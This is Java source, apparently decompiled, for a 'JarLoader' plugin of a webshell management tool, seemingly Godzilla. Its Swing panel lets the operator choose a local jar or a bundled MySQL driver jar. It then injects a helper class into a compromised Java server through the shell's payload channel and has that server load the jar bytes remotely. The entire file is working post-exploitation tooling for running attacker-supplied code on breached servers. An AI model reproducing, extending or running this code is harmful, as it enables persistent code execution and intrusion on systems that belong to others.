package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import java.awt.BorderLayout;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import javax.swing.filechooser.FileNameExtensionFilter;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginnAnnotation(
   payloadName = "JavaDynamicPayload",
   Name = "JarLoader"
)
public class JarLoader implements Plugin {
   private static final String CLASS_NAME = "plugin.JarLoader";
   private static final String[] DB_JARS = new String[]{"mysql"};
   private JPanel panel = new JPanel(new BorderLayout());
   private JComboBox<String> jarComboBox;
   private JButton loadJarButton = new JButton("LoadJar");
   private JButton selectJarButton = new JButton("select Jar");
   private JButton loadDbJarButton = new JButton("LoadDbJar");
   private JLabel jarFileLabel = new JLabel("JarFile: ");
   private JTextField jarTextField = new JTextField(30);
   private JSplitPane meterpreterSplitPane;
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;

   public JarLoader() {
      this.jarComboBox = new JComboBox(DB_JARS);
      this.meterpreterSplitPane = new JSplitPane();
      this.meterpreterSplitPane.setOrientation(0);
      this.meterpreterSplitPane.setDividerSize(0);
      JPanel TopPanel = new JPanel();
      TopPanel.add(this.jarFileLabel);
      TopPanel.add(this.jarTextField);
      TopPanel.add(this.selectJarButton);
      TopPanel.add(this.loadJarButton);
      JPanel bottomPanel = new JPanel(new GridBagLayout());
      GBC gbcJarCommbox = (new GBC(0, 0)).setInsets(5, -40, 0, 0);
      GBC gbcLoadDb = (new GBC(0, 1)).setInsets(5, -40, 0, 0);
      bottomPanel.add(this.jarComboBox, gbcJarCommbox);
      bottomPanel.add(this.loadDbJarButton, gbcLoadDb);
      this.meterpreterSplitPane.setTopComponent(TopPanel);
      this.meterpreterSplitPane.setBottomComponent(bottomPanel);
      this.panel.add(this.meterpreterSplitPane);
   }

   private void selectJarButtonClick(ActionEvent actionEvent) {
      JFileChooser chooser = new JFileChooser();
      chooser.setFileFilter(new FileNameExtensionFilter("*.jar", new String[]{"jar"}));
      chooser.setFileSelectionMode(0);
      chooser.showDialog(new JLabel(), "选择");
      File selectdFile = chooser.getSelectedFile();
      if (selectdFile != null) {
         this.jarTextField.setText(selectdFile.getAbsolutePath());
      } else {
         Log.log("用户取消选择.....");
      }

   }

   private void loadJarButtonClick(ActionEvent actionEvent) {
      try {
         File jarFile = new File(this.jarTextField.getText());
         InputStream inputStream = new FileInputStream(jarFile);
         byte[] jarByteArray = functions.readInputStream(inputStream);
         inputStream.close();
         JOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
      } catch (Exception var5) {
         Log.error(var5);
         JOptionPane.showMessageDialog(this.panel, var5.getMessage(), "提示", 2);
      }

   }

   private void loadDbJarButtonClick(ActionEvent actionEvent) {
      try {
         InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.jar", this.jarComboBox.getSelectedItem()));
         byte[] jarByteArray = functions.readInputStream(inputStream);
         inputStream.close();
         JOptionPane.showMessageDialog(this.panel, this.loadJar(jarByteArray), "提示", 1);
      } catch (Exception var4) {
         Log.error(var4);
         JOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", 2);
      }

   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/JarLoader.class");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("plugin.JarLoader", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error(var3);
         }
      }

   }

   private String loadJar(byte[] jarByteArray) {
      this.load();
      ReqParameter praameter = new ReqParameter();
      praameter.add("jarByteArray", jarByteArray);
      String resultString = this.encoding.Decoding(this.payload.evalFunc("plugin.JarLoader", "run", praameter));
      Log.log(resultString);
      return resultString;
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModel();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }
}
